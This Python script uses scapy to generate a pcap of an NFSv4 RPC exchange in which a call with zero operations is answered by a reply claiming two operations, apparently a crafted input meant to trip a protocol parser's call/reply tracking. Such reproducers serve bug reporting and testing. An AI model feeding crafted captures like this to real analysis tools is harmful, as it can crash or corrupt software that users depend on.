#!/usr/bin/env python3
import struct
from scapy.all import Ether, IP, TCP, Raw, wrpcap

def u32(value):
    return struct.pack("!I", value)

def rpc_record(body):
    return u32(0x80000000 | len(body)) + body

xid = 0xDEADBEEF
call = rpc_record(
    u32(xid)
    + u32(0)          # CALL
    + u32(2)          # RPC version
    + u32(100003)     # NFS
    + u32(4)          # NFSv4
    + u32(1)          # COMPOUND
    + u32(0) + u32(0)  # AUTH_NONE credentials
    + u32(0) + u32(0)  # AUTH_NONE verifier
    + u32(0)          # empty tag
    + u32(1)          # minor version
    + u32(0)          # zero request operations; xid map is already stored
)

compound_reply = (
    u32(0) + u32(0) + u32(2)  # status, empty tag, two operations
    + u32(52) + u32(0) + u32(1) + u32(1)  # SECINFO_NO_NAME, OK, one AUTH_SYS
    + u32(25) + u32(0) + u32(1) + u32(8) + b"EVILDATA"  # READ, OK, EOF, data
)
reply = rpc_record(
    u32(xid)
    + u32(1)          # REPLY
    + u32(0)          # MSG_ACCEPTED
    + u32(0) + u32(0)  # AUTH_NONE verifier
    + u32(0)          # SUCCESS
    + compound_reply
)

C, S, CP, SP = "10.0.0.1", "10.0.0.2", 40000, 2049
CM, SM = "02:00:00:00:00:01", "02:00:00:00:00:02"

def packet(to_server, flags, seq, ack=0, payload=b""):
    if to_server:
        base = Ether(src=CM, dst=SM) / IP(src=C, dst=S) / TCP(sport=CP, dport=SP, flags=flags, seq=seq, ack=ack)
    else:
        base = Ether(src=SM, dst=CM) / IP(src=S, dst=C) / TCP(sport=SP, dport=CP, flags=flags, seq=seq, ack=ack)
    return base / Raw(payload) if payload else base

packets = [
    packet(True, "S", 1000),
    packet(False, "SA", 2000, 1001),
    packet(True, "A", 1001, 2001),
    packet(True, "PA", 1001, 2001, call),
    packet(False, "A", 2001, 1001 + len(call)),
    packet(False, "PA", 2001, 1001 + len(call), reply),
    packet(True, "A", 1001 + len(call), 2001 + len(reply)),
]
for i, p in enumerate(packets):
    p.time = 1.0 + i / 1000000.0
wrpcap("input.pcap", packets)
